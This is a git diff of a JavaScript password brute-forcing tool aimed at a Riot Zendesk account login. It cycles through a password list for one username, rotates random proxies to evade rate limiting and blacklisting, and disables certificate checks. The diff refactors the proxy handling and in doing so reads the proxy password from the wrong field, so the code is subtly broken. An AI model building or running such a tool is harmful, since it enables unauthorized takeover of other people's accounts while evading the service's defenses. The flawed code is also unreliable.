@@ -1,15 +1,11 @@
 import { Zendesk } from './riot/Zendesk.js';
 import { HttpsProxyAgent } from 'https-proxy-agent';
 import * as fs from 'fs';
-import {
-  AuthFailureError,
-  LoginFailureError,
-  RateLimitedError,
-  SessionCookieError,
-} from './errors/index.js';
+import { AuthFailureError, LoginFailureError, RateLimitedError, SessionCookieError } from './errors/index.js';
 import { Logger } from './util/Logger.js';
 import config from './config.json' assert { type: 'json' };
 import { readLines, sleep } from './util/funcs.js';
+import * as Types from './typedef.js';
 
 // Disable certificate validation
 // because some proxies use self-signed certificates
@@ -23,9 +19,14 @@ const USERNAME = config.username;
 
 const logger = Logger.getInstance();
 
-// Read passlist & proxy list
+// Read passlist
 const passwords = readLines(config.pass_list_path);
-const proxies = readLines(config.proxy_list_path);
+
+// Read proxy list
+let proxies;
+if (config.use_proxy_list === true) {
+  proxies = readLines(config.proxy_list_path);
+}
 
 let found = false;
 let foundPassword = '';
@@ -50,29 +51,35 @@ async function doWork(password) {
   for (;;) {
     checkFound();
 
-    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
-    if (!proxy) continue;
-    const split = proxy.split(':');
-    const proxyHost = split[0];
-    const proxyPort = split[1];
-    let proxyUser = null;
-    let proxyPass = null;
+    /**
+     * @type {Types.Proxy}
+     */
+    const proxy = {};
+    let proxyAgent = null;
+    if (proxies) {
+      const proxyLine = proxies[Math.floor(Math.random() * proxies.length)];
+      if (!proxyLine) continue;
+      const split = proxyLine.split(':');
 
-    // check if proxy has credentials
-    if (split.length >= 4) {
-      proxyUser = split[2];
-      proxyPass = split[3];
+      proxy.host = split[0];
+      proxy.port = split[1];
+
+      // check if proxy has credentials
+      if (split.length >= 4) {
+        proxy.user = split[2];
+        proxy.pass = split[4];
+      }
+
+      proxy.address = `${proxy.host}:${proxy.port}`;
+      proxy.url =
+        proxy.user && proxy.pass
+          ? `http://${proxy.user}:${proxy.pass}@${proxy.host}:${proxy.port}`
+          : `http://${proxy.host}:${proxy.port}`;
+      proxyAgent = new HttpsProxyAgent(proxy.url);
     }
 
-    const proxyAddress = `${proxyHost}:${proxyPort}`;
-    const proxyUrl =
-      proxyUser && proxyPass
-        ? `http://${proxyUser}:${proxyPass}@${proxyHost}:${proxyPort}`
-        : `http://${proxyHost}:${proxyPort}`;
+    logger.log(`Trying ${USERNAME}:${password}${proxy.host ? ' on Proxy ' + proxy.address : ''}`);
 
-    const proxyAgent = new HttpsProxyAgent(proxyUrl);
-
-    logger.log(`Trying ${USERNAME}:${password} on Proxy: ${proxyAddress}`);
     try {
       const zendesk = new Zendesk(USERNAME, password, proxyAgent);
       await zendesk.login();
@@ -86,10 +93,7 @@ async function doWork(password) {
       }
 
       // proxy rate limited, or blacklisted, try next proxy
-      if (
-        err instanceof RateLimitedError ||
-        err instanceof SessionCookieError
-      ) {
+      if (err instanceof RateLimitedError || err instanceof SessionCookieError) {
         logger.error(err);
         continue;
       }
